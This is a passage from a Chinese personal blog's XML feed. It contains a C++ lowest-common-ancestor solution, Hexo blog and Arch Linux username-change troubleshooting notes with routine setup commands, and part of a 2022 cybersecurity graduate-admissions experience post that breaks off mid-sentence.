id="树中两个结点的最低公共祖先★"><a href="https://www.acwing.com/problem/content/84/">树中两个结点的最低公共祖先★</a></h2><p>给出一个二叉树，输入两个树节点，求它们的最低公共祖先。</p><p>一个树节点的祖先节点包括它本身。</p><p><strong>注意：</strong></p><ul><li>输入的二叉树不为空；</li><li>输入的两个节点一定不为空，且是二叉树中的节点；</li></ul><p><strong>数据范围</strong></p><p>树中节点数量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>500</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,500]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">500</span><span class="mclose">]</span></span></span></span>。</p><p><strong>样例</strong></p><pre><code>二叉树[8, 12, 2, null, null, 6, 4, null, null, null, null]如下图所示：    8   / \  12  2     / \    6   41. 如果输入的树节点为2和12，则输出的最低公共祖先为树节点8。2. 如果输入的树节点为2和6，则输出的最低公共祖先为树节点2。</code></pre><h3 id="递归法-6">递归法</h3><p>lowestCommonAncestor返回值意义</p><ol><li>若p,q都属于Tree, 则返回最低公共祖先</li><li>若只有一方(如p)属于Tree, 则返回p</li><li>若两者都不属于Tree, 则返回null</li></ol><p>时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>: 每个点最多遍历一次</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(NULL), right(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">if</span> (root == p || root == q) <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">auto</span> left = <span class="built_in">lowestCommonAncestor</span>(root-&gt;left, p, q);</span><br><span class="line">    <span class="keyword">auto</span> right = <span class="built_in">lowestCommonAncestor</span>(root-&gt;right, p, q);</span><br><span class="line">    <span class="keyword">if</span> (left &amp;&amp; right) <span class="keyword">return</span> root;</span><br><span class="line">    <span class="keyword">if</span> (left) <span class="keyword">return</span> left;</span><br><span class="line">    <span class="keyword">return</span> right;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《剑指offer》 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客踩坑</title>
      <link href="/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-hexo%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91/"/>
      <url>/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-hexo%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>笔者原计划在原博客中增加评论功能，以及让Google和百度收录自己的博客，没想到踩坑花了差不多整个上午+下午的时间，故写篇博客记录一下踩过的坑。</p><span id="more"></span><p>主要参考了 <a href="https://qianfanguojin.top/categories/Hexo%E5%8D%9A%E5%AE%A2/">谢同学的博客 : : Hexo专栏</a> 和一些官方文档，下面介绍一些自己踩过的坑：</p><h1 id="搭建Waline-评论-Vercel设置环境变量时输错名">搭建Waline 评论-Vercel设置环境变量时输错名</h1><p>问题描述：在Vercel添加环境变量进行Redeploy后点击visit就可以前往评论页面了，结果登陆和注册都返回500（未初始），最后发现是环境变量名写错了。</p><p>解决方法：Vercel添加环境变量时，名称不是<code>Lean Cloud</code>而是对应的<code>Vercel Environment</code>名（自己应该早点想到：环境变量不都是大写字母和_组合的样子）</p><table><thead><tr><th>Lean Cloud</th><th>Vercel Environment</th></tr></thead><tbody><tr><td>AppID</td><td>LEAN_ID</td></tr><tr><td>AppKey</td><td>LEAN_KEY</td></tr><tr><td>MasterKey</td><td>LEAN_MASTER_KEY</td></tr></tbody></table><h1 id="升级next至版本8以支持Waline">升级next至版本8以支持Waline</h1><p>问题描述：在next的配置文件中添加waline支持后，发现执行<code>hexo g &amp;&amp; hexo s</code>后报错，通过检查<code>theme/next/package.json</code>文件发现是版本是7（也可以通过在hexo博客目录执行<code>npm list</code>查看hexo和next版本）。</p><p>解决方式：升级next主题。</p><p>直接放<a href="https://theme-next.js.org/docs/getting-started/upgrade.html">官网链接 : : Upgrade</a>吧，由于人情事故，v8和v7仓库名不同，故无法通过<code>git pull</code>进行升级。</p><p>官网介绍的很充分，笔者再提醒一个地方，就是<a href="https://theme-next.js.org/docs/getting-started/installation.html">Installation</a>指向的<a href="https://theme-next.js.org/docs/getting-started/configuration.html">Alternate Theme Config</a> 说明了应当把next的配置文件放在hexo的根目录下。笔者采用的方法是复制next的<code>_config.yml</code>文件，然后放进hexo的<code>_config.yml</code>文的<code>theme_config:</code>中，如下图所示：</p><p><img src="/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-hexo%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91/image-20221106211028338.png" alt></p><h1 id="Hexo文章图片显示问题">Hexo文章图片显示问题</h1><p>问题描述：之前通过配置解决好了显示问题，但是由于本人卸载过</p><p>解决方法：执行<code>npm install https://github.com/7ym0n/hexo-asset-image</code>安装改版的<code>hexo-asset-image</code></p><p><strong>优雅引用图片的方法：（编辑器和博客中都正确显示，且插入图片方便）</strong></p><ul><li><p>在<code>Hexo</code>目录下<code>_config.yml</code> 中有 <code>post_asset_folder</code>将其设置为<code>true</code>。这样在建立文件时<code>Hexo</code>会自动建立一个与文章同名的文件夹，这样就可以把与该文章相关的所有资源（图片H）都放到那个文件夹里方便后面引用。</p></li><li><p>执行<code>npm install https://github.com/7ym0n/hexo-asset-image</code>安装改版的<code>hexo-asset-image</code></p></li><li><p>设置typora偏好，在图像设置中进行如下设置，使得在编辑过程中插入图片时，typora会自动将图片放入对应文件夹，并使用typora和博客都能识别的路径</p></li></ul><p><img src="/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-hexo%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91/image-20221106212313568.png" alt></p><p>参考：</p><h1 id="让Google小姐和度娘知道自己的Github博客">让Google小姐和度娘知道自己的Github博客</h1><h2 id="Step1：验证谷歌和百度是否已经收录自己的网站">Step1：验证谷歌和百度是否已经收录自己的网站</h2><p>网站在没有提交搜索引擎收录之前，直接搜索你网站的内容是搜不到的，因为搜索引擎不会去检索你的Github仓库。但还是得先验证一下：</p><p>在谷歌搜索和百度搜索中分别输入<code>site:https://&lt;blogUrl&gt; </code> 如果搜不到就验证了未被收录；否则，应当进行以下操作</p><h2 id="Step2：站点验证">Step2：站点验证</h2><p>访问<a href="https://search.google.com/search-console">search.google.com/search-console</a>，选择<code>Add property</code>:</p><p><img src="/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-hexo%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91/image-20221108145146113.png" alt></p><p>推荐选择<code>HTML标签验证</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;google-site-verification&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&lt;bverify code&gt;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>只需要复制content对应的值（不包括括号），然后粘贴进主题（如<code>NexT</code>）的<code>_config.yml</code>中的<code>google-site-verification:  </code> 后面就行。</p><p><img src="/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-hexo%E5%8D%9A%E5%AE%A2%E8%B8%A9%E5%9D%91/image-20221108145826335.png" alt></p><p><a href="https://ziyuan.baidu.com/dashboard/index">百度验证</a>同理。</p><p>注意：到这里，由于在本地操作，还不能完成验证。但是在本地博客查看网页源码时已经能看到<code>&lt;meta name=&quot;google-site-verification&quot; content=&quot;&lt;bverify code&gt;&quot; /&gt;</code>标签了。</p><h2 id="Step3：给站点添加sitemap">Step3：给站点添加sitemap</h2><p>站点地图(Site Map)是用来注明网站结构的文件，我们希望搜索引擎的爬虫了解我们的网站结构，以便于高效爬取内容，快速建立索引。</p><p>插件可以帮助我们便捷完成sitemap建立。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-sitemap --save # 谷歌</span><br><span class="line">npm install hexo-generator-baidu-sitemap --save # 百度</span><br></pre></td></tr></table></figure><p>安装完执行<code>hexo clean &amp;&amp; hexo g</code>，已经能在public文件夹中看到对应的<code>sitemap.xml</code>和<code>baidusitemap.xml</code>了。</p><p>然后执行<code>hexo d</code>更新github pages，就可以完成google和百度的验证了。</p><p>不过完成验证后需要一段时间才能让站点被搜索到。</p><p>参考: <a href="https://huiyu-li.github.io/2019/11/27/Tools/2019-11-27-%E8%AE%A9%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2%E5%88%B0%E8%87%AA%E5%B7%B1%E5%86%8DGitHub%E4%B8%8A%E7%9A%84%E5%8D%9A%E5%AE%A2/">让谷歌搜索到自己在GitHub上的博客</a></p><h1 id="主题从NexT修改为butterfly">主题从NexT修改为butterfly</h1><p>诚然NexT很优秀，但是笔者需要一款功能更加强大（主要是想试试更加花里胡哨）的主题，所以选择了butterfly。体验一天后，butterfly非常强大，且可定制化程度高，非常适合自己。下面分享自己踩过的几个坑。</p><h2 id="katex不渲染">katex不渲染</h2><p>严格安装<a href="https://butterfly.js.org/posts/ceeb73f/#Math-%E6%95%B8%E5%AD%B8">官网教程</a>操作，结果<code>katex</code>依然无法正常渲染（但<code>mathjax</code>可正常使用）。经过长期探索，查看<code>npm list</code>结果时发现有个包<code>hexo-renderer-pandoc</code>，尝试删除后发现<code>katex</code>可以正常渲染了🤣</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm un hexo-renderer-pandoc --save </span><br></pre></td></tr></table></figure><h2 id="配置hexo-renderer-markdown-it">配置hexo-renderer-markdown-it</h2><p>之前一直想让hexo博客支持扩展语法：比如<mark>文字高亮、上下标</mark>。但是hexo默认的<code>hexo-renderer-marked</code>渲染插件难以升任此任务，上面在配置katex时已经安装了<code>hexo-renderer-markdown-it</code>。只需要开启一些插件就能实现文字高亮等功能 <a href="https://blog.bugimg.com/works/hexo-renderer-markdown-it_and_plugins_config.html#anchors">CXPLAY : : hexo-renderer-markdown-it 的配置与插件配置</a></p>]]></content>
      
      
      <categories>
          
          <category> 踩坑记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArchLinux用户更名踩坑</title>
      <link href="/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-ArchLinux%E7%94%A8%E6%88%B7%E6%9B%B4%E5%90%8D%E8%B8%A9%E5%9D%91/"/>
      <url>/2022/11/04/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-ArchLinux%E7%94%A8%E6%88%B7%E6%9B%B4%E5%90%8D%E8%B8%A9%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>用户更名，这么重要的事情千万不能看点杂七杂八的blog就动手（说的就是本文，当然得先看最新的<a href="https://wiki.archlinux.org/title/Users_and_groups_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E4%BF%AE%E6%94%B9%E7%99%BB%E5%BD%95%E5%90%8D%E6%88%96%E4%B8%BB%E7%9B%AE%E5%BD%95">archwiki</a>呀！</p><span id="more"></span><h1 id="wiki圣经部分">wiki圣经部分</h1><ul><li>按照wiki圣经使用<code>usermod</code>更改用户主目录和用户登录名</li><li>修改<code>/etc/sudoers</code></li><li>修改<code>~/.bashrc</code>、<code>~/.zshrc</code>、<code>.config/fish/config.fish</code>: 将<code>/home/&lt;oldname&gt;</code>都替换为<code>$HOME</code> （之前贪图方便root的<code>.*shrc</code>配置文件都是从用户目录下建立软链接过去的……后悔.jpg）</li></ul><h1 id="踩坑部分">踩坑部分</h1><p>wiki中提到的最后一点，才是折腾的开始：</p><blockquote><ul><li>系统（桌面快捷方式，脚本等）里使用了旧的用户主目录的地方，都需要进行修改。要在脚本中避免这样的问题，可以使用<code>~</code>或<code>$HOME</code>变量来表示主目录。</li></ul></blockquote><p>建议执行以下操作：确保你不是使用你要修改的用户名登录，同时按下(<code>Ctrl</code>+<code>Alt</code>+<code>F1</code>)打开一个新的终端，使用root用户登录，然后执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">sed -i <span class="string">&quot;s/&lt;oldname&gt;/&lt;newname&gt;/g&quot;</span> `grep &lt;oldname&gt; -rl &lt;newname&gt;` <span class="comment"># 递归将/home/&lt;newname&gt;目录下的所有文件中&lt;oldname&gt;替换为&lt;newname&gt; </span></span><br></pre></td></tr></table></figure><p>下面是未执行以上操作导致的踩坑行为（羞。</p><h2 id="anaconda-miniconda">anaconda/miniconda</h2><p>**问题描述：**执行<code>printenv | grep &lt;oldname&gt;</code>发现<code>PATH</code>、<code>CONDA_PYTHON_EXE</code>等环境变量未被修改（此时<code>.*shrc</code>已经修改）。</p><p>发现以下几个文件中在使用绝对路径时使用<oldname>导致环境变量中出现<oldname></oldname></oldname></p><ul><li><code>miniconda3/etc/profile</code>和<code>miniconda3/etc/fish</code>两个目录下中文件文件</li><li><code>miniconda3/shell/condabin/conda-hook.ps1</code></li><li><code>~/.conda/environments.txt</code></li></ul><p><strong>解决方法：<strong>修改完在sh中执行conda等命令就不会报错啦，<strong>但是<code>miniconda3/bin</code>下可执行文件首行基本都是<code>#!/home/&lt;oldname&gt;/miniconda3/bin/python3.9</code></strong>，我没有测试运行python程序，但猜测可能后续运行时会报错，因此建议</strong>重装</strong><code>anaconda/miniconda</code></p><h2 id="软链接（笔者自己设置挖的坑）">软链接（笔者自己设置挖的坑）</h2><p><strong>命令软链接：</strong> 之前有通过<code>ln -s</code>创建软链接到<code>/usr/local/bin</code>目录下，由于都放在该目录下所以去检查一下就好啦。</p><p><strong>软链接共享文件：</strong></p><ul><li><p>root的<code>.zshrc</code>和<code>.p10k.zsh</code>都是通过普通用户链接过去的</p></li><li><p>google-chrome和chromium共享配置文件（包括历史信息等)，文件位置位于<code>.config/google-chrome</code>和<code>.config/chromium</code></p></li></ul><p><code>unlink</code>掉然后重新建立链接吧。</p><h2 id="KDE应用">KDE应用</h2><blockquote><p>plasma设计挺优秀的，可能会出一点小问题，总体上没啥大问题。</p></blockquote><h3 id="dolphin的常用目录">dolphin的常用目录</h3><p>问题描述：点击常用目录里的<code>桌面(/Desktop)</code>然后提示<code>\home\&lt;oldname&gt;\Desktop</code>未找到。</p><p>解决方法：进入plasmasetting发现常用位置里各个目录路径都改为了<newname>对于的路径，本来还以为是啥配置文件没修改到位，结果发现dolphin常用位置里的<code>桌面</code>原来是可以右键后选择<code>编辑</code>的，修改下路径就好。</newname></p><h3 id="头像-壁纸-锁屏壁纸">头像 &amp; 壁纸 &amp; 锁屏壁纸</h3><p>设置都没了，重新设置就好了（插一嘴：感觉plasma默认的壁纸其实挺耐看的，越看越好看）。</p><h2 id="配置文件重要的软件">配置文件重要的软件</h2><blockquote><p>推荐修改配置文件或者删除配置文件。</p></blockquote><h3 id="virtual-box">virtual box</h3><p>问题描述：<code>vbox</code>界面报错信息包含<oldname></oldname></p><p>解决方式：可以删配置文件也可以修改配置文件（将<code>～/Virtualbox VMs</code>中的虚拟机配置文件和<code>.config/virtualbox</code>中<code>\home\&lt;oldname&gt;</code>改为<code>$HOME</code>应该就行）。</p><h2 id="配置文件不重要的软件">配置文件不重要的软件</h2><blockquote><p>删除配置文件重新登陆就好啦。</p></blockquote><h3 id="baidunetdisk">baidunetdisk</h3><p>问题描述：百度网盘下载时显示路径无权限，下载失败。</p><p>解决方法：重装无效（卸载时保留着配置文件），还好马上猜到了是用户更名导致的问题，直接<code>rm -rf ~/.config/baidunetdisk/</code>删除配置文件，然后重新登陆吧。</p><blockquote><p>可能还有其他的坑（发现了再更新吧……</p><p>archwiki虽然强大但对新手不太优化，强推一份archlinux简明指南：<a href="https://arch.icekylin.online/">arch.icekylin.online/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 踩坑记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-网安保研（清深大数据、复旦、上交、中科大、武大）</title>
      <link href="/2022/10/18/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93-2022-%E7%BD%91%E5%AE%89%E4%BF%9D%E7%A0%94/"/>
      <url>/2022/10/18/%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93-2022-%E7%BD%91%E5%AE%89%E4%BF%9D%E7%A0%94/</url>
      
        <content type="html"><![CDATA[<p>分享一篇保研经验贴希望学弟学妹们能少走弯路。</p><span id="more"></span><h1 id="个人背景">个人背景</h1><ul><li>学校：西电</li><li>专业：网络空间安全（实验班）</li><li>成绩：1 / 40</li><li>英语：四级509，六级509</li><li>奖学金：一次国奖，优秀学生标兵之类的</li><li>综合情况：密码赛国二（自己做的挺水），数模国赛省一、美赛M奖、“深圳杯”三等奖……一段没产出但是做的很有趣的科研/经历，无论文，无专利。总的来说，不得不承认自己也是GPA灌水five一枚！</li></ul><h1 id="申请学校">申请学校</h1><h2 id="基本出发点">基本出发点</h2><ul><li><p>不直博、最好学硕（专硕学费不贵也行）</p><blockquote><p>强组导师人也好应该可以考虑直博的，一般导建议还是算了，不过强组直博可能比硕士还难。总之不要谈直博色变，感觉清北更愿意在本部招收直博生，在深圳和北大软微愿意去招收硕士（不过清华网研院拿到学硕机会还比较大）。如果自己确实有学术追求、有过正经的科研经历就可以去联系老师，可以实习下试试。</p></blockquote></li><li><p>学校Title &gt; 方向&amp;导师 &gt; 地域 &gt; 学校环境和生活条件</p><blockquote><p>学校title会跟自己一辈子，能去清北就清北吧，之前还觉得上交网安可能比清华网研院好（网研院大方向不喜欢），但其实清北和其他学校还是有断崖式差距，不过如果能找到上交zhj、浙大zyj这类谁去都不会后悔的牛导也不比清北差。想去牛导就早点联系老师，认真对待老师安排的任务吧（一般就是阅读论文+顶会复现）。</p></blockquote></li><li><p>清华本部机试难度较大，上交其他学校网安牛导很多在计院，是有机试的，所以如果想读硕士，一定要好好练机试。</p><blockquote><p>如果自己感觉对机试没有打算，感觉很难下手，不如把目标具体化：y总说刷完acwing算法提高题通过清华机试就基本没啥问题。如果想读硕士就好好练吧，夹杂个私货如下（学长宣传邀请只能获得优惠券-&gt;肯定觉得课好才会想着再买课）：</p><p>AcWing【AC之星】教育优惠计划！<a href="https://www.acwing.com/user/security/school_verify/ac_stars/">acwing.com</a> 我的邀请码是：LODKZ</p></blockquote></li><li><p>本人胆子有点小，清北不敢报，直博不敢报，不太敢提前联系老师，直到清华报名最后一天才被上交招生办气得匆匆报了清深大数据，其实没试清北本部有点遗憾的。</p><blockquote><p>不要因为自己通过学校考核的把握不大就不敢联系老师，联系好老师的好处至少有2点：1、面试时他就在现场，帮你说一句这学生还是不错的啥的，其他老师就都懂了；2、可能过了复试心仪老师就被别人联系走了。所以如果真是心仪老师，就不要怕打扰老师，初试前、复试前、复试后各发一次邮件，前2次没联系上正常，过了复试还是还不回请马上联系其他老师。</p></blockquote></li></ul><h2 id="夏令营申请">夏令营申请</h2><p>2022夏令营报名和截止日期：<a href="https://github.com/LinghaoChan/CSSummerCamp2022">CSSummerCamp2022</a></p><blockquote><p>2023的到时把仓库名中“2022”改为”2023“应该就是吧。<strong>建议把“保研小白必看经验贴”里内容看一遍</strong>，回想起来还是很有道理，很多老师google主页都没有，近三年dblp都没多少文章，可能就是转行政了，如果想读博就不推荐了。</p></blockquote><p>当时相信自己能进上交，所以报的学校也不多。</p><table><thead><tr><th style="text-align:center">学校</th><th style="text-align:center">学院/项目</th><th style="text-align:center">初审</th><th style="text-align:center">考核</th><th style="text-align:center">备注</th></tr></thead><tbody><tr><td style="text-align:center">复旦fdu</td><td style="text-align:center">计算机学院 网安</td><td style="text-align:center">过</td><td style="text-align:center">机试太差，挂</td><td style="text-align:center">没联系老师</td></tr><tr><td style="text-align:center">上交sjtu</td><td style="text-align:center">电院 网安</td><td style="text-align:center">过</td><td style="text-align:center">学硕</td><td style="text-align:center">联系到了心仪的导师</td></tr><tr><td style="text-align:center">武大whu</td><td style="text-align:center">网安学院 网安</td><td style="text-align:center">过</td><td style="text-align:center">学硕</td><td style="text-align:center">没联系老师</td></tr><tr><td style="text-align:center">中科大ustc</td><td style="text-align:center">网安学院 网安</td><td style="text-align:center">过</td><td style="text-align:center">学硕</td><td style="text-align:center">没联系老师</td></tr></tbody></table><h2 id="预推免申请">预推免申请</h2><p>2022预推免报名和截止日期：<strong><a href="https://github.com/CS-BAOYAN/CSYuTuiMian2022">CSYuTuiMian2022</a></strong></p><p>本来已经计划去上交了，但是我等上交近2个月了，直到8月31日上交还不告诉我学硕还是专硕，于是在清华报名前一天报了清深大数据，计划预推免冲冲清北。</p><table><thead><tr><th style="text-align:center">学校</th><th style="text-align:center">学院/项目</th><th style="text-align:center">初审</th><th style="text-align:center">考核</th><th style="text-align:center">备注</th></tr></thead><tbody><tr><td style="text-align:center">清华thu</td><td style="text-align:center">深研院 大数据</td><td style="text-align:center">过</td><td style="text-align:center">专硕</td><td style="text-align:center">没联系老师</td></tr><tr><td style="text-align:center">北大pku</td><td style="text-align:center">深研院 计算机</td><td style="text-align:center">未过</td><td style="text-align:center"></td><td style="text-align:center">没尝试联系老师，没人推荐</td></tr></tbody></table><p>当还挺想去北深zys老师那，而且北深计算机都是0812学硕，但是我没参加夏令营，联系老师也太晚，没联系上，据说z老师八月底就会对同学进行考核。北深是弱com，同专业另一位同学联系上了，所以我没过初审，她过了。</p><p>清深据说比北深生源好、bar高，虽然清深没有很对口的老师，但还是报了。</p><blockquote><p>跨考联系老师很吃力，折腾了一个月近日终于联系到了一个人很好的老师，厉害又谦虚，也能让我继续做安全，对我来说算是最好的去处。</p></blockquote><p>北大计院没有机试，直博名额比学硕多，之前一直以为没有做安全的老师（确实少），但是最近和nudt的同学交流了解到了xt老师。老师做软件的、学术水平极高、学术讨论直接、对学生好、虽然忙但微信回消息快……所以不要没认真看清北所有老师主页就直观上以为没老师做自己喜欢的方向。</p><h1 id="保研经历">保研经历</h1><blockquote><p>以面试时间顺序为序</p></blockquote><h2 id="复旦网安">复旦网安</h2><p>报名最后一天才匆匆报名，报名后没认真看老师方向，结果发现好像自己好像找不到感兴趣的老师，所以有点摆。</p><p>复旦网安和清华网研院是为数不多的有机试的网安学院，小趴菜没有好好听学姐话，没练机试，结果做的很差，最后干脆摆烂没交报告（其实暴力做的交个报告也行呀）。看完acwing算法基础题后感觉其实能做的，所以早点跟y总好好学吧。虽然机试不算分，但是后面老师打分基本上根据机试成绩打分来的，所以有机试的基本机试就决定了成败。</p><p>复旦英文面试是很难准备的，背个自我介绍然后随便聊的，我觉得聊项目或者专业知识很轻松，问了我联邦学习和同态加密是什么（项目用到了）；但是聊生活上的就很难答好，问了如果你很努力但是还是失败了会怎样（面试背景墙上有句“我能行，I CAN DO IT”，这个问题在武大面试也被问了）。总之就是沉着冷静微笑着去聊吧，咱这英语一下也提升不了。</p><p>综合面试不需要准备PPT，主要问机试和抽的专业问题，专业问题问了：CA给银行中颁发的证书中有什么、然后问了我一些移动端安全的概念……其他的忘了，知道的就把知道的都说出来，不知道的就说不知道吧。</p><h2 id="上交网安">上交网安</h2><p>上交网安对西电很友好，或者说全国的网安院校对西电都较友好，因为最早全国只有两个密码学博士学位授予点，一个在信息工程大学（军校)，一个在西电。每年西电去上交网安的学生都不少，能拿到学硕的也不少，加上听学长学姐说老师们人很好，所以一直很想去。</p><p>我直到过了初试才和心仪老师发邮件（当时有个一起做项目的队友，拿着我和另一个队友做的工作，早早去联系这个老师，然后一直搞得我挺痛苦的），不过我发了邮件后老师很快对我表示感兴趣，我当时傻了吧唧的没问老师要个微信，但是老师回我邮件让我那段时间心态好了很多。</p><p>今年由于疫情不能线下面试，所以取消了笔试，改为面试时抽三个专业题。我抽到的问题比较简单：1、静态检测病毒和动态检测有啥区别；2、信息熵的定义；3、如果美国对中国封禁了根域名服务器将对中国产生什么样的影响。虽然都没专门学过，但是都答上来了。我面试的很轻松，没有问很深的项目细节（之前学长学姐好像听说在上交被问的比较细），我感觉聊的太简单可能打分很难很高，所以主动谈自己的理解，把问题聊深一点。加上面试前学姐提醒我“自信大方”、面试前一晚我姐还专门给我模拟面试，所以整体面试下来感觉良好，面试后有老师让我加微信，告诉我表现还不错。（注意刚加老师时要注意礼貌，不要激动过头了）</p><p>暑假前夕老师给我推了师兄微信，给了毕设题目，师兄和老师人都很好，氛围感觉很好，方向也很喜欢，所以暑假有点躺平，加上陆陆续续拔了三颗智齿，为了缓解疼痛打起了游戏嘿嘿，所以暑假时就决定去上交了。当时师兄问过我一次决定去上交没，我当时其实觉得80%几率去上交，但还是谨慎的告诉师兄预推免时想试试清华，当时告诉爸妈后他们一直说我嘴笨让我先答应蛮，自己当时也有点后悔吧。不过还好正因为自己的诚实，后面才敢参加清深的预推免。</p><h2 id="武大网安">武大网安</h2><p>武大因为离家近所以还挺想去的，不过上交面完觉得能去上交肯定上交，没有提前联系老师。</p><p>面试挺轻松吧，本来没让我放PPT，然后我主动和老师说能不能共享下（觉得自己用latex做的beamer还算好看），主考官欣然说好，后面聊的很轻松，英语问答聊项目问的有点快，但还是通过“privacy”和“robustness”等关键词猜出了大意，中文问答我只记得让我回答paillier同态加解密公式时（项目中用到了），我解密公式有点忘了，然后后面还聊到了我背景墙上的那句“我能行”。总的来说面完上交比较放松，自己表现的也还可以吧。</p><h2 id="中科大网安">中科大网安</h2><p>中科大听说环境好，面试提前极好，优营率高，所以想着报了保底。</p><p>上一届实验班第一学姐就中科大没入营，可能是中科大觉得是oq吧，我觉得可以提前联系下老师，我们这届有排名7/40左右的同学提前联系好老师最后拿到了学硕。中科大这边老师挺多老师做量子计算和数学的，我比较想联系的是做分布式机器学习的zpy老师，不过由于周围有同学联系上了z老师，加上想去上交的原因，最后还是决定不打扰老师了。中科大这边优营率很高，然后联系好老师达成双选才会最终被录取。可以报名前提前联系下老师试试，优营后没联系上不要急，要相信鸽子的力量，最终总会联系上的。</p><p>中科大面试体验确实好，发了纪念品，面试时还有负责人的志愿者提醒，还分上下午两场面试求平均分以追求公平性。中科大会有抽题，我一般就有第一题就抽第一题，结果第一题问通信原理，然后换第二题也是通信，当时我就有一点慌（自己通信还有信号这些课学的不咋地），然后一下换到十一题问区块链会使用到哪些密码算法。中科大英文面试是抽题，问常见问题，让我英文再自我介绍一次，然后介绍家乡。下午的问题忘了，当天生日，下午玩去了，反正较简单轻松。</p><h2 id="清深大数据">清深大数据</h2><p>清北报名都挺麻烦，不然估计报名人数能翻几番，还好学姐告诉我清深大数据预推免听说没有机试，也不用做项目，最后就报名了。</p><p>我没咋准备，我这懒狗感觉没有把握的事情就不想去努力（这是我之后联系老师很吃力的根本原因），没想到能过。英文面试是翻译一段有关强化学习的文章，他放了两段，但说的确实是“one 